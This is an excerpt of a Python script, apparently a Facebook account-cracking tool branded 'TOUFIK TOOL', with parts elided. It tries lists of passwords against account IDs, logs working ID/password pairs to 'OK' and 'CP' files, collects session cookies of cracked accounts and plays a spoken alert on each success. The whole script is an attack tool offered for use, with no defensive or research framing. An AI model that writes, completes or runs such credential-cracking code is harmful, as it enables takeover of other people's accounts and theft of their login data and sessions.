...
os.system('espeak -a 300 " WELCOME TO TOUFIK TOOL"')
...
os.system("xdg-open https://t.me/toufik090")

#------------------[ LOGO-LAKNAT ]-----------------#

logo =""" 
\033[1;32m888888  dP"Yb  88   88 888888 88 88  dP 
\033[1;32m  88   dP   Yb 88   88 88__   88 88odP  
\033[1;32m  88   Yb   dP Y8   8P 88""   88 88"Yb  
\033[1;32m  88    YbodP  `YbodP' 88     88 88  Yb 
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r {P}[TOUFIK-XD💥]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31m[TOUFIK-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[TOUFIK-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                os.system('espeak -a 300 " TOUFIK CRACKED OK ID"')
...
def crackfree(idf,pwv):
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m||')
                print(f'\r\033[0;93m[\33[1;96mTOUFIK-CP\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m||')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m||')
                print(f'\r\33[1;93m[\33[1;92mTOUFIK-OK\33[1;93m] \33[1;92m{idf} {pw} ')
                os.system('espeak -a 300 " TOUFIK CRACKED OK ID"')
                print ('\x1b[32m||')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                cek_DYNO(kuki)
